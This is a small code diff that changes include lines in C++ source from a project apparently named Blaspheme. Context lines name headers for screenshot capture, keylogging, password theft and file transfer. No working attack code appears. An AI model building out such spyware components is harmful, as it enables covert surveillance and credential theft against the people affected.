@@ -12,7 +12,6 @@ using namespace System;
 
 #include <blaspheme/transfer/FileTransfer.hpp>
 #include <blaspheme/Blaspheme.hpp>
-#include <common/Convert.hpp>
 using namespace Blaspheme;
 using namespace Network;
 
@@ -23,7 +22,7 @@ using namespace Network;
 #include <malicious/Screenshot.hpp>
 #include <malicious/Keylogger.hpp>
 #include <malicious/Passwords.hpp>
-#include <common/Logger.hpp>
+#include <common/Log.hpp>
 #include <system/System.hpp>
 using namespace Malicious;
 
